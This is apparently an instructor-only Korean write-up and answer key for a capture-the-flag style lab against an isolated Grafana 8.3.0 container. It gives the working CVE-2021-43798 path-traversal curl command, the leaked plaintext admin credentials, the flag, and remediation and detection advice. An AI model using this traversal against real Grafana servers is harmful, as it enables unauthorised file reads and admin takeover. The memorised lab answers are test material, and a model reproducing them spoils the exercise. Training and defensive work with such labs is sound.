---
title: "ES Lab1 — ES-Ops Grafana Write-up"
lab: "ES Lab1"
target_system: "ES-Ops Grafana"
difficulty: "Easy"
stages: 1
date_built: "2026-09-07"
status: "Verified"
tags:
  - es-lab
  - grafana
  - cve-2021-43798
  - path-traversal
---

# ES Lab1 — ES-Ops Grafana Write-up (Official)

> Instructor 전용 정답 문서. 학생 배포판(`README.md`)에는 자격증명·flag를 포함하지 않는다.

## 0. 문서 범위

이 문서는 ES사(가상 기업) 침투테스트 실습 랩 중 `lab1`(Easy, 단일 스테이지)의 공식 풀이다. 대상은 이 랩 전용으로 구축된 컨테이너(`es-ops-grafana`, `grafana/grafana:8.3.0`)이며, 실제 프로덕션 시스템이 아니다. 본문의 모든 명령·응답은 랩 구축 및 검증 과정에서 실제로 실행해 확인한 결과다.

## 1. 시나리오

> ES 인프라팀이 운영 중인 모니터링 대시보드가 외부에 노출되어 있는 것으로 추정된다. 접근 가능 여부와 정보 노출 수준을 점검하라.

## 2. 실습 환경

| 항목 | 값 |
|---|---|
| 대상 | `$TARGET:3000` (`$TARGET` = lab1이 배포된 호스트 외부 IP) |
| 서비스 | Grafana `8.3.0` |
| 네트워크 | 전용 Docker 브리지(`lab1-net`), 다른 랩과 격리 |
| 관리자 자격증명 저장 위치 | `/etc/grafana/grafana.ini` (평문) — 컨테이너 내부, 마운트된 커스텀 설정 파일 |

## 3. 공격 흐름

```mermaid
flowchart LR
    A[버전 핑거프린팅] --> B["CVE-2021-43798 대상 버전 확인 (8.0.0-beta1~8.3.0)"]
    B --> C["경로 순회 payload로 /etc/grafana/grafana.ini 미인증 읽기"]
    C --> D["평문 admin_password 추출"]
    D --> E["Grafana 관리자 로그인"]
    E --> F["ES-Ops Internal Notes 대시보드에서 flag 획득"]
```

**한 줄 공격 체인**: Grafana 버전 확인 → CVE-2021-43798 확인 → 경로 순회로 설정 파일 미인증 읽기 → 평문 관리자 비밀번호 추출 → 로그인 → flag.

## 4. 단계별 상세

### 4.1 정보 수집 — 서비스 버전 확인

**목표**: 대상이 CVE-2021-43798의 영향 범위(8.0.0-beta1 ~ 8.3.0)에 해당하는지 확인한다.

**검증**:

```bash
curl -sI http://$TARGET:3000/login
curl -s http://$TARGET:3000/api/health
```

**핵심 결과**:

```json
{"commit":"...","database":"ok","version":"8.3.0"}
```

**판정**: `version: 8.3.0` 확인 — CVE-2021-43798 영향 범위에 포함됨.

### 4.2 취약점 식별 — CVE-2021-43798

Grafana의 플러그인 정적 자산 핸들러(`/public/plugins/<pluginId>/`)가 경로 정규화 없이 파일 경로를 그대로 전달해, `../` 시퀀스로 웹 루트 밖의 임의 파일을 인증 없이 읽을 수 있다. 내장 플러그인(`alertlist` 등 core plugin ID)의 경로만 알면 되므로 별도 인증이나 사전 정보가 필요 없다. `[외부 검증됨]` — [Grafana 공식 GitHub Security Advisory GHSA-8vwj-jr6f-8m3g](https://github.com/grafana/grafana/security/advisories/GHSA-8vwj-jr6f-8m3g)

### 4.3 익스플로잇 — 미인증 임의 파일 읽기

**검증 명령**:

```bash
curl --path-as-is \
  "http://$TARGET:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini"
```

**핵심 결과** (실제 응답, 랩 검증 시점):

```ini
# ES-Ops 임시 점검용 Grafana 설정
# 운영팀이 급하게 켜둔 뒤 원복하지 못한 상태라는 설정
[security]
admin_user = admin
admin_password = Es0psTemp!2026

[users]
allow_sign_up = false

[auth.anonymous]
enabled = false
```

**성공 판정**: HTTP 200과 함께 서버 파일시스템의 실제 설정 파일 내용이 그대로 반환됨을 확인했다(단순 200 응답이 아니라 실제 로컬 파일 내용을 근거로 판정).

**취약점 원인과 공격 조건**:
- 원인: 플러그인 정적 자산 서빙 로직의 경로 검증 누락(CVE-2021-43798, CWE-22 경로 순회)
- 공격 조건: 대상이 영향 버전(8.0.0-beta1~8.3.0)이고 3000/tcp에 도달 가능하면 별도 인증 없이 성립

### 4.4 자격증명 추출

읽어낸 `grafana.ini`의 `[security]` 섹션에서 평문 관리자 자격증명을 바로 확인할 수 있다.

```
admin_user = admin
admin_password = Es0psTemp!2026
```

**취약점 원인**: 설정 파일에 자격증명을 평문으로 저장(CWE-256 / CWE-798, Use of Hard-coded Credentials 계열)한 운영보안 실패. CVE 자체와는 별개의 결함이며, CVE가 이 결함의 노출 경로가 되었다는 점이 이 랩의 핵심 학습 포인트다.

### 4.5 로그인 및 flag 획득

**검증 명령**:

```bash
curl -s -u 'admin:Es0psTemp!2026' \
  http://$TARGET:3000/api/dashboards/uid/es-ops-internal-notes
```

**핵심 결과**:

```
esfg{V2VsbCBkb25lISBFUy1PcHMgTGFiMSBjbGVhci4=}
```

base64 디코딩 시: `Well done! ES-Ops Lab1 clear.`

**성공 판정**: 획득한 자격증명으로 인증된 API 응답(HTTP 200 + 대시보드 JSON 본문)을 받았고, 그 안에서 flag 문자열을 직접 확인했다. 대조군으로 이전 단계 없이 흔한 기본 자격증명(`admin`/`admin123`)으로 동일 요청을 보내면 `HTTP 401`이 반환됨을 확인해, 이 익스플로잇 체인이 실제로 필요함을 검증했다.

## 5. 취약점 요약

| # | 분류 | 이름 | 위치 | 영향 |
|---|---|---|---|---|
| 1 | 공개 CVE | CVE-2021-43798 (Grafana 8.0.0-beta1~8.3.0, 경로 순회) | `/public/plugins/<pluginId>/` | 미인증 임의 파일 읽기 |
| 2 | 위험한 구성 | 설정 파일 평문 자격증명 저장 | `/etc/grafana/grafana.ini` | CVE로 노출 시 관리자 계정 완전 탈취 |

## 6. 탐지 및 대응

- **근본 원인 1(CVE-2021-43798)**: Grafana를 8.3.1/8.2.7/8.1.8/8.0.7 이상(공식 패치 버전)으로 업그레이드.
- **근본 원인 2(평문 자격증명)**: 초기 관리자 비밀번호를 설정 파일이 아닌 시크릿 매니저 또는 최초 부팅 후 즉시 변경하는 프로세스로 전환. 설정 파일은 root 외 읽기 금지 권한으로 제한.
- **탐지 가능한 흔적**: `access.log`(또는 Grafana 자체 요청 로그)에서 `/public/plugins/*/../` 패턴을 포함한 요청, 정적 자산 경로에 대한 비정상적으로 깊은 `../` 시퀀스.

## 7. 핵심 학습 포인트

1. 배너/버전 하나만 확인해도 공개 CVE 매칭이 가능하다 — 버전 핑거프린팅이 정보 수집의 핵심 단계다.
2. 경로 순회 취약점은 "인증 우회"가 아니라 "인증 자체가 필요 없는" 엔드포인트에서 발생할 때 특히 위험하다.
3. CVE 하나만으로는 끝이 아니다 — 이 랩처럼 CVE가 다른 취약한 구성(평문 자격증명 저장)을 노출시키는 시너지가 실제 침해에서도 흔하다.
4. `curl --path-as-is`처럼 클라이언트가 URL을 임의로 정규화하지 않게 하는 옵션이 경로 순회 검증에 필수적이다.

## 8. 참고 자료

- [Grafana 공식 Security Advisory GHSA-8vwj-jr6f-8m3g (CVE-2021-43798)](https://github.com/grafana/grafana/security/advisories/GHSA-8vwj-jr6f-8m3g)

## 부록 — 정답 (Instructor 전용)

| 항목 | 값 |
|---|---|
| 익스플로잇으로 확보되는 자격증명 | `admin` / `Es0psTemp!2026` |
| 최종 flag | `esfg{V2VsbCBkb25lISBFUy1PcHMgTGFiMSBjbGVhci4=}` |
| flag 디코딩 결과 | `Well done! ES-Ops Lab1 clear.` |
